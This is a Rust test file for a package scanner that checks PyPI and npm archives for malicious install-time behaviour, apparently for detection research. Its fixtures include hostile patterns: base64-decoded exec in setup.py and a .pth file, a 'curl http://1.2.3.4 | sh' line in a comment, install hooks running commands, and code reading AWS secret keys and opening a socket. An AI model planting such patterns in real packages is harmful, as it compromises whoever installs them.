mod common;

use common::*;
use customs_scan::{feature_names, scan_archive, Ecosystem, ScanOptions, ScanReport};
use std::collections::BTreeSet;

fn scan(bytes: &[u8], name: &str) -> ScanReport {
    scan_archive(bytes, name, None, &ScanOptions::default()).unwrap()
}

fn scan_tokens(bytes: &[u8], name: &str) -> ScanReport {
    let opts = ScanOptions {
        tokens: true,
        ..Default::default()
    };
    scan_archive(bytes, name, None, &opts).unwrap()
}

fn assert_full_key_set(r: &ScanReport) {
    let expected: BTreeSet<String> = feature_names().iter().map(|s| s.to_string()).collect();
    let got: BTreeSet<String> = r.features.keys().cloned().collect();
    assert_eq!(got, expected);
    assert!(r.features.values().all(|v| v.is_finite()));
}

const BAD_INDICATORS: [&str; 9] = [
    "proc_exec",
    "dyn_code",
    "decode_obf",
    "env_access",
    "secret_paths",
    "persistence",
    "download_exec",
    "exfil_endpoint",
    "ip_url",
];

#[test]
fn benign_sdist_end_to_end() {
    let bytes = benign_sdist();
    let r = scan(&bytes, "demo-1.0.0.tar.gz");
    assert_full_key_set(&r);
    assert_eq!(r.schema_version, 1);
    assert_eq!(r.ecosystem, Ecosystem::Pypi);
    assert_eq!(r.name.as_deref(), Some("demo"));
    assert_eq!(r.version.as_deref(), Some("1.0.0"));
    assert_eq!(r.sha256.len(), 64);
    assert_eq!(r.install_surface, vec!["setup.py", "demo/__init__.py"]);
    for ind in BAD_INDICATORS {
        assert_eq!(r.features[&format!("all_{ind}")], 0.0, "{ind}");
    }
    let f = &r.features;
    assert_eq!(f["has_setup_py"], 1.0);
    assert_eq!(f["n_py"], 4.0);
    assert_eq!(f["n_files"], 6.0);
    assert_eq!(f["inst_n_files"], 2.0);
    assert_eq!(f["meta_has_repo"], 1.0);
    assert_eq!(f["meta_has_license"], 1.0);
    assert_eq!(f["meta_has_author_email"], 1.0);
    assert_eq!(f["meta_n_deps"], 1.0);
    assert_eq!(f["meta_desc_len"], "A tiny demo package".len() as f64);
    assert_eq!(
        f["meta_readme_bytes"],
        "# demo\n\nAdds numbers.\n".len() as f64
    );
    assert_eq!(f["meta_version_major"], 1.0);
    assert_eq!(f["meta_version_is_zero"], 0.0);
    assert!(r
        .evidence
        .iter()
        .all(|e| e.indicator == "url" || e.indicator == "network"));
    assert!(r.tokens.is_none());
}

#[test]
fn benign_wheel_end_to_end() {
    let r = scan(&benign_wheel(), "demo-1.0.0-py3-none-any.whl");
    assert_full_key_set(&r);
    assert_eq!(r.ecosystem, Ecosystem::Pypi);
    assert_eq!(r.name.as_deref(), Some("demo"));
    assert_eq!(r.install_surface, vec!["demo/__init__.py"]);
    assert_eq!(r.features["has_setup_py"], 0.0);
    assert_eq!(r.features["meta_n_deps"], 1.0);
    assert_eq!(r.features["all_proc_exec"], 0.0);
}

#[test]
fn benign_npm_end_to_end() {
    let r = scan_tokens(&benign_npm(), "tiny-demo-1.2.3.tgz");
    assert_full_key_set(&r);
    assert_eq!(r.ecosystem, Ecosystem::Npm);
    assert_eq!(r.name.as_deref(), Some("tiny-demo"));
    assert_eq!(r.version.as_deref(), Some("1.2.3"));
    assert_eq!(r.install_surface, vec!["lib/index.js"]);
    assert_eq!(r.features["n_npm_install_scripts"], 0.0);
    assert_eq!(r.features["has_package_json"], 1.0);
    assert_eq!(r.features["meta_n_keywords"], 2.0);
    assert_eq!(r.features["meta_has_homepage"], 1.0);
    // `fetch(url)` appears only in a comment.
    assert_eq!(r.features["all_network"], 0.0);
    let toks = r.tokens.unwrap();
    assert_eq!(toks[0], "<file>");
    assert!(toks.contains(&"padstart".to_string()));
    assert!(toks.contains(&"<str>".to_string()) || toks.contains(&"use".to_string()));
}

#[test]
fn malicious_setup_py_fires_install_time_indicators() {
    let r = scan_tokens(&malicious_sdist(), "evil-demo-0.0.1.tar.gz");
    assert_full_key_set(&r);
    let f = &r.features;
    assert!(f["inst_dyn_code"] >= 1.0);
    assert!(f["inst_decode_obf"] >= 1.0);
    assert!(f["inst_proc_exec"] >= 1.0);
    assert!(f["inst_download_exec"] >= 1.0);
    assert_eq!(f["inst_ip_url"], 1.0);
    assert_eq!(f["meta_version_is_zero"], 1.0);
    assert_eq!(f["meta_desc_len"], 0.0);
    let ev = r
        .evidence
        .iter()
        .find(|e| e.indicator == "dyn_code")
        .expect("dyn_code evidence");
    assert_eq!(ev.file, "setup.py");
    assert_eq!(ev.line, 9);
    assert_eq!(ev.snippet, "exec(base64.b64decode(payload))");
    // The most telling evidence comes first.
    assert_eq!(r.evidence[0].indicator, "download_exec");
    let toks = r.tokens.unwrap();
    for t in ["exec", "base64", "b64decode", "system", "<str>"] {
        assert!(toks.contains(&t.to_string()), "missing token {t}");
    }
}

#[test]
fn malicious_npm_install_chain_is_on_the_install_surface() {
    let r = scan(&malicious_npm(), "evil-npm-demo-99.0.0.tgz");
    assert_full_key_set(&r);
    assert_eq!(
        r.install_surface,
        vec![
            "package.json:scripts.preinstall",
            "package.json:scripts.postinstall",
            "scripts/install.js",
            "scripts/helper.js",
            "index.js",
        ]
    );
    let f = &r.features;
    assert_eq!(f["n_npm_install_scripts"], 2.0);
    assert_eq!(f["inst_download_exec"], 1.0);
    assert_eq!(f["inst_exfil_endpoint"], 1.0);
    assert_eq!(f["inst_env_access"], 1.0);
    assert_eq!(f["inst_recon"], 2.0);
    assert!(f["inst_network"] >= 3.0);
    assert_eq!(f["meta_version_huge"], 1.0);
    assert_eq!(f["meta_version_major"], 99.0);
    let pre = r
        .evidence
        .iter()
        .find(|e| e.file == "package.json:scripts.preinstall")
        .expect("script evidence");
    assert_eq!(pre.line, 6);
    assert!(pre.snippet.starts_with("curl"));
}

#[test]
fn inline_node_eval_requires_join_the_install_surface() {
    let pj = r#"{"name": "inl", "version": "1.0.0",
        "scripts": {"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}}"#;
    let bytes = tar_gz_files(&[
        ("package/package.json", pj),
        (
            "package/postinstall.js",
            "require('child_process').execSync('id');\n",
        ),
        ("package/index.js", "module.exports = 1;\n"),
    ]);
    let r = scan(&bytes, "inl-1.0.0.tgz");
    assert_eq!(
        r.install_surface,
        vec![
            "package.json:scripts.postinstall",
            "postinstall.js",
            "index.js"
        ]
    );
    assert_eq!(r.features["inst_proc_exec"], 2.0);
}

#[test]
fn install_hooks_follow_named_scripts_and_bun_run() {
    let pj = r#"{"name": "ind", "version": "1.0.0", "main": "lib/main.js",
        "scripts": {"preinstall": "bun run index.js", "postinstall": "npm run setup",
                    "setup": "yarn fetch", "fetch": "node tools/fetch.js", "test": "node t.js"}}"#;
    let bytes = tar_gz_files(&[
        ("package/package.json", pj),
        (
            "package/index.js",
            "require('child_process').execSync('id');\n",
        ),
        (
            "package/tools/fetch.js",
            "require('https').get('https://x.example/p');\n",
        ),
        ("package/t.js", "require('child_process').execSync('id');\n"),
        ("package/lib/main.js", "module.exports = 1;\n"),
    ]);
    let r = scan(&bytes, "ind-1.0.0.tgz");
    assert_eq!(
        r.install_surface,
        vec![
            "package.json:scripts.preinstall",
            "index.js",
            "package.json:scripts.postinstall",
            "package.json:scripts.setup",
            "package.json:scripts.fetch",
            "tools/fetch.js",
            "lib/main.js"
        ]
    );
    assert_eq!(r.features["n_npm_install_scripts"], 2.0);
    assert_eq!(r.features["inst_network"], 1.0);
    assert!(r.features["inst_proc_exec"] >= 1.0);
}

#[test]
fn comments_do_not_count_end_to_end() {
    let setup = "# import subprocess; subprocess.call('curl http://1.2.3.4 | sh')\n'''\nos.system is not called\n'''\nfrom setuptools import setup\nsetup(name='quiet')\n";
    let bytes = tar_gz_files(&[("quiet-1.0/setup.py", setup)]);
    let r = scan(&bytes, "quiet-1.0.tar.gz");
    assert_eq!(r.features["inst_proc_exec"], 0.0);
    assert_eq!(r.features["inst_download_exec"], 0.0);
    assert_eq!(r.features["inst_ip_url"], 0.0);
}

#[test]
fn pth_file_in_wheel_is_install_surface() {
    let bytes = zip_files(&[
        ("demo/__init__.py", b""),
        (
            "demo-init.pth",
            b"import os; exec(__import__('base64').b64decode('cHJpbnQoMSk='))\n",
        ),
        (
            "demo-1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
        ),
    ]);
    let r = scan(&bytes, "demo-1.0-py3-none-any.whl");
    assert!(r.install_surface.contains(&"demo-init.pth".to_string()));
    assert!(r.features["inst_dyn_code"] >= 2.0);
    assert_eq!(r.features["inst_decode_obf"], 1.0);
}

#[test]
fn src_layout_and_cmdclass_targets() {
    let bytes = tar_gz_files(&[
        ("lay-1.0/setup.cfg", "[metadata]\nname = lay\n[options]\ncmdclass =\n    install = lay_build.hooks.Install\n"),
        ("lay-1.0/lay_build/hooks.py", "import subprocess\n"),
        ("lay-1.0/src/lay/__init__.py", "import socket\n"),
        ("lay-1.0/pyproject.toml", "[build-system]\nrequires = []\nbuild-backend = \"backend\"\nbackend-path = [\"_custom\"]\n"),
        ("lay-1.0/_custom/backend.py", "eval('1')\n"),
    ]);
    let r = scan(&bytes, "lay-1.0.tar.gz");
    assert_eq!(
        r.install_surface,
        vec![
            "lay_build/hooks.py",
            "_custom/backend.py",
            "src/lay/__init__.py"
        ]
    );
    assert_eq!(r.features["inst_proc_exec"], 1.0);
    assert_eq!(r.features["inst_dyn_code"], 1.0);
    assert_eq!(r.features["inst_network"], 1.0);
}

#[test]
fn setup_time_imports_join_the_install_surface() {
    let bytes = tar_gz_files(&[
        (
            "imp-1.0/setup.py",
            "from setuptools import setup\nfrom imp.version import V\nfrom imp import _hooks\nsetup(name='imp')\n",
        ),
        // On the surface, but its imports lead into the library and are not followed.
        ("imp-1.0/imp/__init__.py", "from .core import run\n"),
        ("imp-1.0/imp/core.py", "import socket\n"),
        ("imp-1.0/imp/_hooks.py", "from .util import helper\n"),
        ("imp-1.0/imp/util/__init__.py", ""),
        ("imp-1.0/imp/util/helper.py", "from ..net.client import go\n"),
        ("imp-1.0/imp/net/client.py", "import os\nos.system('id')\n"),
        ("imp-1.0/imp/version.py", "V = '1'\n"),
        ("imp-1.0/imp/cli.py", "import subprocess\n"),
    ]);
    let r = scan(&bytes, "imp-1.0.tar.gz");
    let mut surface = r.install_surface.clone();
    surface.sort();
    assert_eq!(
        surface,
        vec![
            "imp/__init__.py",
            "imp/_hooks.py",
            "imp/net/client.py",
            "imp/util/__init__.py",
            "imp/util/helper.py",
            "imp/version.py",
            "setup.py",
        ]
    );
    assert_eq!(r.features["inst_proc_exec"], 1.0);
    assert_eq!(r.features["inst_network"], 0.0);
    assert_eq!(r.features["all_network"], 1.0);
    assert_eq!(r.features["all_proc_exec"], 2.0);
}

#[test]
fn ecosystem_detection_by_content() {
    // npm content inside a PyPI-looking name.
    let r = scan(&benign_npm(), "tiny-demo-1.2.3.tar.gz");
    assert_eq!(r.ecosystem, Ecosystem::Npm);
    // PyPI content inside an npm-looking name.
    let r = scan(&benign_sdist(), "demo-1.0.0.tgz");
    assert_eq!(r.ecosystem, Ecosystem::Pypi);
    // No useful file name at all.
    let r = scan(&benign_wheel(), "blob");
    assert_eq!(r.ecosystem, Ecosystem::Pypi);
    assert_eq!(r.name.as_deref(), Some("demo"));
    // An explicit ecosystem wins.
    let r = scan_archive(
        &benign_sdist(),
        "x",
        Some(Ecosystem::Npm),
        &ScanOptions::default(),
    )
    .unwrap();
    assert_eq!(r.ecosystem, Ecosystem::Npm);
    assert_full_key_set(&r);
}

#[test]
fn wrapper_directories_are_stripped_to_the_package_root() {
    // Sample collections often re-pack extracted packages under several directories.
    let bytes = zip_files(&[
        (
            "tmp/tmpab12/demo/demo-1.0.0/PKG-INFO",
            BENIGN_PKG_INFO.as_bytes(),
        ),
        (
            "tmp/tmpab12/demo/demo-1.0.0/setup.py",
            MALICIOUS_SETUP_PY.as_bytes(),
        ),
        ("tmp/tmpab12/demo/demo-1.0.0/demo/__init__.py", b""),
    ]);
    let r = scan(&bytes, "2024-01-01-demo-v1.0.0.zip");
    assert_eq!(r.ecosystem, Ecosystem::Pypi);
    assert_eq!(r.install_surface, vec!["setup.py", "demo/__init__.py"]);
    assert!(r.features["inst_dyn_code"] >= 1.0);
    assert_eq!(r.features["has_setup_py"], 1.0);

    let npm = zip_files(&[
        (
            "tmp/x/evil/package/package.json",
            MALICIOUS_PACKAGE_JSON.as_bytes(),
        ),
        ("tmp/x/evil/package/index.js", b"module.exports = 1;\n"),
    ]);
    let r = scan(&npm, "evil.zip");
    assert_eq!(r.ecosystem, Ecosystem::Npm);
    assert_eq!(r.features["n_npm_install_scripts"], 2.0);
}

#[test]
fn evidence_cap_and_priority() {
    let mut big = String::from("import os\n");
    for i in 0..100 {
        big.push_str(&format!("u{i} = 'https://example.com/{i}'\n"));
    }
    let bytes = tar_gz_files(&[
        ("cap-1.0/setup.py", "import os\nos.system('id')\n"),
        ("cap-1.0/cap/util.py", &big),
    ]);
    let opts = ScanOptions {
        max_evidence: 5,
        ..Default::default()
    };
    let r = scan_archive(&bytes, "cap-1.0.tar.gz", None, &opts).unwrap();
    assert_eq!(r.evidence.len(), 5);
    assert_eq!(r.evidence[0].file, "setup.py");
    assert_eq!(r.evidence[0].indicator, "proc_exec");
    assert_eq!(r.features["all_url"], 100.0);
}

#[test]
fn report_serializes_to_design_shape() {
    let r = scan(&malicious_sdist(), "evil-demo-0.0.1.tar.gz");
    let v = serde_json::to_value(&r).unwrap();
    for k in [
        "schema_version",
        "ecosystem",
        "archive",
        "sha256",
        "name",
        "version",
        "features",
        "evidence",
        "install_surface",
        "errors",
    ] {
        assert!(v.get(k).is_some(), "missing {k}");
    }
    assert!(v.get("tokens").is_none());
    assert_eq!(v["ecosystem"], "pypi");
}

#[test]
fn features_do_not_depend_on_the_archive_file_name() {
    // A package without a manifest version: only the file name carries one.
    let tgz = tar_gz_files(&[("pkg-9.9/pkg/__init__.py", "import os\n")]);
    let opts = ScanOptions::default();
    let a = scan_archive(&tgz, "pkg-99.0.0.tar.gz", Some(Ecosystem::Pypi), &opts).unwrap();
    let b = scan_archive(&tgz, "0123abcd.tar.gz", Some(Ecosystem::Pypi), &opts).unwrap();
    assert_eq!(a.features, b.features);
}

#[test]
fn behavior_concentrated_in_one_file() {
    // Payload: process, network and environment access together in one module.
    let packed = tar_gz_files(&[
        ("lib-1.0/setup.py", "from setuptools import setup\nsetup(name='lib')\n"),
        (
            "lib-1.0/lib/x.py",
            "import os, subprocess, socket\nk = os.environ['AWS_SECRET_ACCESS_KEY']\nsubprocess.run(['id'])\nsocket.create_connection(('1.2.3.4', 80))\n",
        ),
        ("lib-1.0/lib/y.py", "import json\n"),
    ]);
    let r = scan(&packed, "lib-1.0.tar.gz");
    assert!(r.features["all_max_file_kinds"] >= 3.0);
    assert_eq!(r.features["all_top_file_share"], 1.0);
    // Off the install surface, so the install-time variant stays at 0.
    assert_eq!(r.features["inst_max_file_kinds"], 0.0);

    // The same behaviors spread one per file.
    let spread = tar_gz_files(&[
        (
            "lib-1.0/setup.py",
            "from setuptools import setup\nsetup(name='lib')\n",
        ),
        (
            "lib-1.0/lib/a.py",
            "import subprocess\nsubprocess.run(['id'])\n",
        ),
        (
            "lib-1.0/lib/b.py",
            "import socket\nsocket.create_connection(('h', 80))\n",
        ),
        ("lib-1.0/lib/c.py", "import os\nk = os.environ['HOME']\n"),
    ]);
    let r = scan(&spread, "lib-1.0.tar.gz");
    assert_eq!(r.features["all_max_file_kinds"], 1.0);
    assert!(r.features["all_top_file_share"] < 0.5);
}
